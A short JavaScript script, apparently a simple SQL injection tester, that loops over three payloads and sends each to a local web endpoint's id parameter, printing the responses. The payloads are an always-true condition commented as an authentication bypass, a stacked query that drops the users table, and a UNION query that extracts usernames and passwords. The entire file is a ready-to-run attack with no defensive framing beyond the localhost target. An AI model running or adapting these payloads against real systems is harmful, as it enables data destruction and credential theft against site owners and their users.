import axios from "axios";
const targetURL = "http://localhost:3000/user?id=";

const payloads = [
  "1 OR 1=1", // Bypasses authentication
  "1; DROP TABLE users; --", // SQL Injection to delete a table
  "' UNION SELECT null, username, password FROM users --",
];

async function runAttack() {
  for (const payload of payloads) {
    try {
      const response = await axios.get(
        `${targetURL}${encodeURIComponent(payload)}`
      );
      console.log(`Payload: ${payload}`);
      console.log(`Response: ${response.data}`);
    } catch (err) {
      console.error(`Error with payload ${payload}:`, err.message);
    }
  }
}

runAttack();
